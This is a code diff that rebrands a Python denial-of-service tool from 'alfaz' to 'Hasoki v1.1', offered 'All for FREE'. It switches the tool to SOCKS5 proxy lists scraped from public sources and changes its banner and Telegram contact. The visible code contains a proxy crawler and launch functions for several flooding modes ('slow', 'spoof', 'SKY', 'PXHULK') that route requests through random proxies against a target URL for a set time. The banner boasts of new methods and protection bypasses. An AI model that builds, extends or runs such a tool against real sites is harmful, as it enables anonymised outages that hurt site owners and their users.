@@ -1,4 +1,7 @@
-# alfaz
+# -*- coding: utf-8 -*-
+# From NV with love
+# Hasoki v1.1
+# All for FREE
 from os import system, name
 import httpx
 import undetected_chromedriver as webdriver
@@ -163,12 +166,12 @@ method = [
 #socks5resource
 proxyResources = [
     'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
-    'https://www.proxy-list.download/api/v1/get?type=sock',
-    'https://www.proxyscan.io/download?type=sock',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/sock.txt',
+    'https://www.proxy-list.download/api/v1/get?type=socks5',
+    'https://www.proxyscan.io/download?type=socks5',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
 ]
-socksFile= "sock.txt"
-
+socksFile= "socks5.txt"
+#GET SOCKS
 def socksCrawler():
     global socksFile, socksResources
     f = open(socksFile,'wb')
@@ -707,7 +710,7 @@ def attackslow(url, timer, threads):
         
 def Launchslow(url, timer):
     socksCrawler()  
-    prox = open("./sock.txt", 'r').read().split('\n')
+    prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -799,7 +802,7 @@ def attackspoof(url, timer, threads):
 
 def Launchspoof(url, timer):
     socksCrawler()  
-    prox = open("./sock.txt", 'r').read().split('\n')
+    prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -837,7 +840,7 @@ def attackSKY(url, timer, threads):
 
 def LaunchSKY(url, timer):
     socksCrawler()  
-    prox = open("./sock.txt", 'r').read().split('\n')
+    prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -875,7 +878,7 @@ def attackPXHULK(url, timer, threads):
 
 def LaunchPXHULK(url, timer):
     socksCrawler()  
-    prox = open("./sock.txt", 'r').read().split('\n')
+    prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     m = random.choice(method)
@@ -1105,27 +1108,25 @@ def tools():
     stdout.write("\n")
 ##############################################################################################
 def title():
-    stdout.write("                                           ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX  +"| ████████▄  ████████▄   ▄██████▄     ▄████████ | CREATE : ALFAZ    |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███   ▀███ ███   ▀███ ███    ███   ███    ███ |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███    ███ ███    ███ ███    ███   ███    █▀  |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███    ███ ███    ███ ███    ███   ███        |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███    ███ ███    ███ ███    ███ ▀███████████ |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███    ███ ███    ███ ███    ███          ███ |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ███   ▄███ ███   ▄███ ███    ███    ▄█    ███ |                   |\n")
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"| ████████▀  ████████▀   ▀██████▀   ▄████████▀  | BY: ALFAZINFOSEC  | 
-    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+    stdout.write("                                                                                          \n")
+    stdout.write("                   "+Fore.LIGHTWHITE_EX  +"██╗  ██╗ █████╗ ███████╗ ██████╗ ██╗  ██╗██╗                 \n")
+    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"██║  ██║██╔══██╗██╔════╝██╔═══██╗██║ ██╔╝██║                 \n")
+    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"███████║███████║███████╗██║   ██║█████╔╝ ██║                \n")
+    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"██╔══██║██╔══██║╚════██║██║   ██║██╔═██╗ ██║                \n")
+    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"██║  ██║██║  ██║███████║╚██████╔╝██║  ██╗██║                \n")
+    stdout.write("                   "+Fore.LIGHTGREEN_EX  +"╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝                \n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       PENTEST DOS MUTIL METHOD           "+Fore.LIGHTGREEN_EX  +"          ║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       ADDED NEW METHOD AND BYPASS    "+Fore.LIGHTGREEN_EX  +"              ║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       YT https:youtube.com/@alfazinfosec   "+Fore.LIGHTGREEN_EX  +"        ║\n")
-    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Type [help] to see the Commands    "+Fore.LIGHTGREEN_EX +"           ║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/adfhjktewwyjqk   "+Fore.LIGHTGREEN_EX  +"          ║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Type [help] to see the Commands    "+Fore.LIGHTGREEN_EX +"          ║\n")
 
     stdout.write("             "+Fore.LIGHTGREEN_EX+"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def command():
-    stdout.write(Fore.LIGHTGREEN_EX+"╔═══"+Fore.LIGHTGREEN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTGREEN_EX+"alfaz_ddos"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    stdout.write(Fore.LIGHTGREEN_EX+"╔═══"+Fore.LIGHTGREEN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTGREEN_EX+"Hasoki"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
     command = input()
     if command == "cls" or command == "clear":
         clear()
